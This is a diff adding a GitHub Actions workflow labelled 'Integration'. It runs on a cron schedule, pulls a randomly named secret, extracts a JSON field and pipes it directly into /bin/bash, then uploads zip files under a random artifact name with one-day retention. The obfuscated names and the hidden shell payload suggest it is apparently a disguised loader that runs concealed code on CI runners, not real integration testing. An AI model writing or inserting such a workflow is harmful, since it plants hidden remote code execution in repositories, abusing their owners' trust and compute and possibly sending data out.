@@ -1,0 +1,27 @@
+name: Integration
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '44 4,10,16,22 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  action:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Begin
+        env:
+          iye96: ${{ secrets.iye96 }}
+        run: |
+          printf '%s' "$iye96" | jq -r .scpw25973 | /bin/bash
+          echo $oan59 | jq -r .nvqhu9883 | /bin/bash
+
+      - name: Save results
+        uses: actions/upload-artifact@v4
+        with:
+          name: Mg7AHlDk
+          path: "*.zip"
+          retention-days: 1
